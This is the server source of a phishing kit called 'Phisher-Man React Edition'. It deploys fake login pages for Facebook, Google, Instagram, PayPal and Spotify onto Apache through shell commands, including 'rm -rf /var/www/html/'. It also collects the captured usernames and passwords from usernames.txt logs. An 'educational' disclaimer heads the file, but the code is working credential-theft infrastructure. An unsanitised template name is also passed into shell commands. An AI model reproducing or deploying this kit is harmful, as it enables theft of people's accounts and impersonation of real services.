/*
 * Phisher-Man React Edition - Educational Security Research Tool
 * 
 * Rebuilt by: apt_start_latifi
 * Discord: https://discord.gg/KcuMUUAP5T
 * Original Tool: https://github.com/FDX100/Phisher-man
 * 
 * This is a complete rebuild of the original Phisher-Man tool in React and Node.js
 * for educational and authorized security testing purposes only.
 * 
 * IMPORTANT: The original repository had no license. This project is a UI rewrite 
 * and modernization of the original concept. All original phishing templates and 
 * concepts remain attributed to FDX100.
 * 
 * EDUCATIONAL PURPOSE ONLY:
 * - Use only in isolated lab environments
 * - Requires explicit authorization for testing
 * - Designed for cybersecurity education and training
 * - Not for production or public deployment
 * 
 * DISCLAIMER: This tool is for educational and authorized testing purposes only.
 * Users are responsible for complying with all applicable laws and regulations.
 * The authors are not responsible for any misuse of this software.
 */

const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const fs = require('fs-extra');
const path = require('path');
const { exec } = require('child_process');
const http = require('http');
const socketIo = require('socket.io');
const os = require('os');

// Apache status handler
let apacheStatus = 'unknown';
let apacheProcess = null;

// Function to get local IP address (127.0.0.1)
function getLocalIPAddress() {
  return '127.0.0.1';
}

// Function to get public IP address (network IP)
function getPublicIPAddress() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const interface of interfaces[name]) {
      if (interface.family === 'IPv4' && !interface.internal && interface.address.startsWith('192.168.')) {
        return interface.address;
      }
    }
  }
  // Fallback: try to get any non-internal IPv4 address
  for (const name of Object.keys(interfaces)) {
    for (const interface of interfaces[name]) {
      if (interface.family === 'IPv4' && !interface.internal) {
        return interface.address;
      }
    }
  }
  return '127.0.0.1';
}

// Function to check Apache status
function checkApacheStatus() {
  exec('systemctl is-active apache2', (error, stdout, stderr) => {
    if (error) {
      apacheStatus = 'stopped';
    } else {
      apacheStatus = stdout.trim();
    }
  });
}

// Check Apache status on startup and every 5 seconds
checkApacheStatus();
setInterval(checkApacheStatus, 5000);

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "http://localhost:3000",
    methods: ["GET", "POST"]
  }
});

const PORT = process.env.PORT || 5000;

// Middleware
app.use(helmet());
app.use(cors());
app.use(morgan('combined'));
app.use(express.json());
app.use(express.static('public'));
app.use(express.static('client/build'));

// Serve static files from phishing sites
app.use('/static', express.static('phishing-sites'));

// Kill processes on port 5000
function killPortProcesses(port) {
  return new Promise((resolve) => {
    exec(`lsof -ti :${port}`, (error, stdout) => {
      if (stdout.trim()) {
        const pids = stdout.trim().split('\n');
        pids.forEach(pid => {
          try {
            process.kill(parseInt(pid), 'SIGKILL');
            console.log(`Killed process ${pid} on port ${port}`);
          } catch (err) {
            // Process might already be dead
          }
        });
      }
      resolve();
    });
  });
}

// Routes
app.get('/api/dashboard', (req, res) => {
  res.json({ 
    message: 'Phisher-Man Dashboard',
    status: 'active',
    templates: [
      { id: 'facebook', name: 'Facebook', logo: '/static/logos/facebook.jpg', description: 'Facebook Login Page phishing' },
      { id: 'google', name: 'Google', logo: '/static/logos/google.jpg', description: 'Google Login Page phishing' },
      { id: 'instagram', name: 'Instagram', logo: '/static/instagram.png', description: 'Instagram Login Page phishing' },
      { id: 'paypal', name: 'PayPal', logo: '/static/logos/paypal.jpeg', description: 'PayPal Login Page phishing' },
      { id: 'spotify', name: 'Spotify', logo: '/static/logos/spotify.jpg', description: 'Spotify Fake Login Page' },
      { id: 'facebook-security', name: 'Facebook Security', logo: '/static/logos/facebook.jpg', description: 'Facebook Security Login Page phishing' }
    ]
  });
});

app.get('/api/server/status', (req, res) => {
  res.json({ status: apacheStatus });
});

app.get('/api/server/ip', (req, res) => {
  res.json({ 
    localIP: getLocalIPAddress(),
    publicIP: getPublicIPAddress()
  });
});

app.post('/api/server/:action', (req, res) => {
  const { action } = req.params;
  
  try {
    console.log(`Apache command: ${action}`);
    
    switch (action) {
      case 'start':
        exec('service apache2 start', (error, stdout, stderr) => {
          if (error) {
            console.error('Apache start error:', error);
            apacheStatus = 'stopped';
          } else {
            console.log('Apache started');
            apacheStatus = 'active';
          }
        });
        break;
      case 'stop':
        exec('service apache2 stop', (error, stdout, stderr) => {
          if (error) {
            console.error('Apache stop error:', error);
          } else {
            console.log('Apache stopped');
            apacheStatus = 'inactive';
          }
        });
        break;
      case 'clear':
        // Completely clear everything in /var/www/html/ (like original app.py)
        const clearCommands = [
          'service apache2 stop',
          'rm -rf /var/www/html/',
          'mkdir -p /var/www/html/',
          'chown -R www-data:www-data /var/www/html/',
          'chmod -R 755 /var/www/html/'
        ];
        
        let clearIndex = 0;
        const executeClearCommand = () => {
          if (clearIndex >= clearCommands.length) {
            console.log('Apache directory completely cleared');
            apacheStatus = 'stopped';
            return;
          }
          
          const command = clearCommands[clearIndex];
          console.log(`Clear executing: ${command}`);
          
          exec(command, (error, stdout, stderr) => {
            if (error) {
              console.error(`Error executing clear command: ${command}`, error);
              console.error('stderr:', stderr);
            }
            
            clearIndex++;
            executeClearCommand();
          });
        };
        
        executeClearCommand();
        break;
    }
    res.json({ success: true, action });
  } catch (error) {
    console.error(`Error in apache function: ${error}`);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/build-scam', (req, res) => {
  const { scamName } = req.body;
  
  if (!scamName) {
    return res.status(400).json({ success: false, message: 'Scam name is required' });
  }
  
  try {
    console.log(`Building scam: ${scamName}`);
    
    // Check if template exists
    const templatePath = path.join(__dirname, 'phishing-sites', scamName);
    if (!fs.existsSync(templatePath)) {
      return res.status(400).json({ success: false, message: `Template ${scamName} not found` });
    }
    
    // Deploy to separate endpoint for each template
    const deployCommands = [
      // Stop Apache
      'service apache2 stop',
      // Clear directory completely
      'rm -rf /var/www/html/',
      // Create fresh directory structure
      'mkdir -p /var/www/html/',
      // Copy template files to template-specific directory
      `mkdir -p /var/www/html/${scamName}/`,
      `cp -a ${templatePath}/. /var/www/html/${scamName}/`,
      // Copy static assets (logos from client/build/static/logos/)
      'mkdir -p /var/www/html/static/',
      'cp -a client/build/static/logos/ /var/www/html/static/',
      'cp -a client/build/static/logos/ /var/www/html/',
      // Create index.html redirect to current template
      `echo '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0; url=/${scamName}/login.html"><title>Redirecting...</title></head><body><p>Redirecting to ${scamName}...</p></body></html>' > /var/www/html/index.html`,
      // Set permissions
      'chown -R www-data:www-data /var/www/html/',
      'chmod -R 755 /var/www/html/',
      // Start Apache
      'service apache2 start'
    ];
    
    // Execute commands sequentially
    let commandIndex = 0;
    const executeNextCommand = () => {
      if (commandIndex >= deployCommands.length) {
        // All commands completed successfully
        console.log(`Template ${scamName} deployed successfully`);
        
        // Update Apache status
        apacheStatus = 'active';
        
        // Get IP addresses
        const localIP = getLocalIPAddress();
        const publicIP = getPublicIPAddress();
        
        // Emit to socket clients
        io.emit('scamDeployed', { scamName, timestamp: new Date(), localIP, publicIP });
        
        res.json({ 
          success: true, 
          message: `Template ${scamName} deployed successfully`,
          localIP: localIP,
          publicIP: publicIP,
          localURL: `http://${localIP}/${scamName}/login.html`,
          publicURL: `http://${publicIP}/${scamName}/login.html`,
          template: scamName
        });
        return;
      }
      
      const command = deployCommands[commandIndex];
      console.log(`Executing: ${command}`);
      
      exec(command, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing command: ${command}`, error);
          console.error('stderr:', stderr);
          return res.status(500).json({ success: false, message: `Failed to execute: ${command}` });
        }
        
        commandIndex++;
        executeNextCommand();
      });
    };
    
    executeNextCommand();
    
  } catch (error) {
    console.error('Error building scam:', error);
    res.status(500).json({ success: false, message: 'Failed to build scam' });
  }
});

app.get('/api/logs', (req, res) => {
  try {
    // First try to find logs in any template directory
    const templateDirs = ['facebook', 'google', 'instagram', 'paypal', 'spotify', 'facebook-security'];
    let logs = '';
    let foundLogs = false;
    
    for (const template of templateDirs) {
      const logPath = `/var/www/html/${template}/usernames.txt`;
      if (fs.existsSync(logPath)) {
        const templateLogs = fs.readFileSync(logPath, 'utf8');
        if (templateLogs.trim()) {
          logs += `=== ${template.toUpperCase()} LOGS ===\n${templateLogs}\n\n`;
          foundLogs = true;
        }
      }
    }
    
    if (foundLogs) {
      res.json({ logs });
    } else {
      res.json({ logs: 'No logs found' });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Serve phishing sites
app.get('/phishing/:site/*', (req, res) => {
  const { site } = req.params;
  const filePath = path.join(__dirname, 'phishing-sites', site, req.params[0]);
  
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send('File not found');
  }
});

// Catch all handler: send back React's index.html file for client-side routing
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'client/build', 'index.html'));
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});

// Start server
async function startServer() {
  console.log('Starting Phisher-Man React...');
  console.log('Freeing port 5000...');
  await killPortProcesses(5000);
  
  server.listen(PORT, '0.0.0.0', () => {
    console.log('Server running on port', PORT);
    console.log('The application will be available at: http://localhost:5000');
    console.log('Press Ctrl+C to stop the application');
  });
}

startServer().catch(console.error);
